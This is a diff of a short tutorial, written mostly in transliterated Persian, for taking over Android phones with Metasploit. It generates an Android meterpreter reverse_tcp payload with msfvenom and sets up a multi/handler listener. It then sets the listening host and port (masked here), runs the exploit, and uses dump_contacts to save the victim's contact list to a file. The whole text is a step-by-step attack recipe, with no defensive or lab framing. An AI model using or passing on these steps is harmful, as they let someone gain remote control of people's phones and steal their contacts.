@@ -13,35 +13,50 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=* LPORT=** -o /home/kali/Deskt
 ```
 
 
+$ sepas abzar metasploit ra ejra mikonim
+
+```bash
+msfconsole
+```
+
+$ bad az baz shodan abzar metasploit b tartib code haye zer ra mizanim
+
+```bash
+use exploit/multi/handler
+```
+
+```bash
+set payload android/meterpreter/reverse_tcp
+```
+
+```bash
+options
+```
+
+```bash
+set LHOST *
+```
+
+```bash
+set LPORT **
+```
 
 
-2) msfconsole
+$ bad az etmam dobare "options" ra zade ta az set shoan "LHOST" va "LPORT" etmenan hasel konim va sepas :
 
+```bash
+options
+```
 
-3) use exploit/multi/handler
+```bash
+exploit
+```
 
-
-4) set payload android/meterpreter/reverse_tcp
-
-
-5) options
-
-
-6) set LHOST *
-
-
-7) set LPORT **
-
-
-8) options   رو بزنیم میبینیم که دو مورد بالا ست شدن options مجدد
-
-
-9) exploit
-
-
-10) help  راهنمای اسکریپت باز می شود
-
+```bash
+help
+```
 
 ---------------------------------------------------------------------------
-example : برای مخاطبین : dump_contacts -o /home/kali/Desktop/contact.txt
+
+`example` : For save contact : `dump_contacts -o /home/kali/Desktop/contact.txt`
 
